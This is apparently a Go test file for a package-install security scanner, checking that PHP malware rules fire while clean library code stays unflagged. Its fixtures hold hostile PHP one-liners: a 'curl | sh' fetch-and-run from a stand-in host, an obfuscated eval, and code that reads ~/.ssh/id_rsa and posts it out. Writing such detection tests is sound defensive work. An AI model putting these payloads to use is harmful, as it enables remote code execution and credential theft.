package codescan

import (
	"testing"

	"github.com/crossben/safe-install/internal/analyze"
)

func TestPHPMalware(t *testing.T) {
	cases := map[string]string{
		"SI-CODE-001": `<?php shell_exec("curl -s https://x.example/p.sh | sh");`,
		"SI-CODE-003": `<?php eval(gzinflate(base64_decode('S0tKBQA=')));`,
		"SI-CODE-002": `<?php $k = file_get_contents(getenv('HOME').'/.ssh/id_rsa'); $c = curl_init('https://x.example'); curl_setopt($c, CURLOPT_POSTFIELDS, $k); curl_exec($c);`,
	}
	for rule, src := range cases {
		if got := pyRulesFromHits(scanPHP(src)); got[rule] == 0 {
			t.Errorf("%s not found in %q: %v", rule, src, got)
		}
	}
	fetched := `<?php $code = file_get_contents('https://x.example/payload'); eval($code);`
	if got := pyRulesFromHits(scanPHP(fetched)); got["SI-CODE-001"] == 0 {
		t.Errorf("eval of fetched code not flagged: %v", got)
	}
}

// Ordinary library code must stay clean.
func TestPHPCleanCode(t *testing.T) {
	clean := `<?php
namespace Acme;
class Client {
    public function get(string $url): string {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        return curl_exec($ch);
    }
    public function check($value) { return $this->assert($value); }
    public function decode(string $s) { return base64_decode($s); }
    public function run() { return exec('git describe'); }
}
`
	if hits := scanPHP(clean); len(hits) != 0 {
		t.Fatalf("clean code flagged: %v", hits)
	}
}

func TestComposerDistSkipsTests(t *testing.T) {
	data := wheel(t, map[string]string{
		"acme-lib-abc123/src/Lib.php":       "<?php class Lib {}",
		"acme-lib-abc123/tests/Exploit.php": `<?php eval(base64_decode('x'));`,
		"acme-lib-abc123/src/Backdoor.php":  `<?php eval(gzinflate(base64_decode('x')));`,
	})
	fs, err := ComposerDist(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(fs) != 1 || fs[0].Rule != "SI-CODE-003" || fs[0].Message[:16] != "src/Backdoor.php" {
		t.Fatalf("findings %v", fs)
	}
}

func pyRulesFromHits(hs []hit) map[string]analyze.Severity {
	out := map[string]analyze.Severity{}
	for _, h := range hs {
		out[h.rule] = h.sev
	}
	return out
}
